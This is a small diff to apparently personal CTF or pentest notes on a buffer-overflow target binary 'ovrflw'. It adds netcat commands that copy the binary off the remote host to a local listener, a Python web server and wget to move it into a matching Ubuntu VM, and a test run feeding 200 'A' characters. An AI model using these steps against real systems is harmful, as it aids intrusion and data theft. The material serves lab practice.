@@ -27,7 +27,16 @@ exploit
 * get files from the remote server
 
   * nc -l -p 999 &gt; ovrflw \(local\)
-  * nc 10.10.12.194 -p 999 &lt; /usr/local/bin/ovrflw \(remote\)
+  * nc -w 5 10.10.12.194  999 &lt; /usr/local/bin/ovrflw \(remote\)
+  * check for md5
 
+* python -m SimpleHTTPServer
+* Run ubuntu with the same version of the target
+  * wget 172.16.10.105:8000/ovrflw
+  * mv ovrflw Desktop
+  * chmod +x ovrflw
+  * ``./ovrflw `python -c 'print "A"*200'` ``
+  * 
+* 
 
 
